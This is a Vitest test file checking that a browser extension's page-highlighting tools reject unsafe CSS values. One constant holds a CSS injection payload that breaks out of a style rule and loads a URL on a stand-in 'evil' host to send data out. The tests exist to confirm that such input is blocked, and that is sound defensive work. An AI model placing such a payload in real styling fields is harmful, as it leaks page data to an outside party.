import { beforeEach, describe, expect, it, vi } from "vitest";

const mockExecuteScript = vi.hoisted(() => vi.fn());

vi.mock("./tab-utils", () => ({
  getActiveTab: vi.fn(async () => ({ id: 7, url: "https://example.com/" })),
}));

vi.stubGlobal("chrome", { scripting: { executeScript: mockExecuteScript } });

import { highlightElementTool, highlightTextInlineTool } from "./page";

const INJECTION = "red} body{background:url(https://evil/?d=x)} .a{";

async function run(tool: unknown, args: unknown) {
  const out = await (
    tool as { invoke: (ctx: unknown, input: string) => Promise<unknown> }
  ).invoke({}, JSON.stringify(args));
  return typeof out === "string" ? JSON.parse(out) : out;
}

beforeEach(() => {
  mockExecuteScript.mockReset();
  mockExecuteScript.mockResolvedValue([{ result: { success: true } }]);
});

describe("page styling tools refuse unsafe CSS values", () => {
  it.each([
    "highlightColor",
    "backgroundColor",
    "fontWeight",
  ])("highlight_text_inline rejects an injected %s without touching the page", async (param) => {
    const result = await run(highlightTextInlineTool, {
      selector: "p",
      searchText: "x",
      [param]: INJECTION,
    });
    expect(result).toMatchObject({ success: false });
    expect(String(result.error)).toContain(param);
    expect(mockExecuteScript).not.toHaveBeenCalled();
  });

  it("highlight_text_inline accepts safe values", async () => {
    await run(highlightTextInlineTool, {
      selector: "p",
      searchText: "x",
      highlightColor: "#00d4ff",
      backgroundColor: "rgba(0, 0, 0, 0.1)",
      fontWeight: "700",
    });
    expect(mockExecuteScript).toHaveBeenCalledOnce();
  });

  it("highlight_element rejects an injected color", async () => {
    const result = await run(highlightElementTool, {
      selector: "p",
      color: INJECTION,
    });
    expect(result).toMatchObject({ success: false });
    expect(mockExecuteScript).not.toHaveBeenCalled();
  });
});
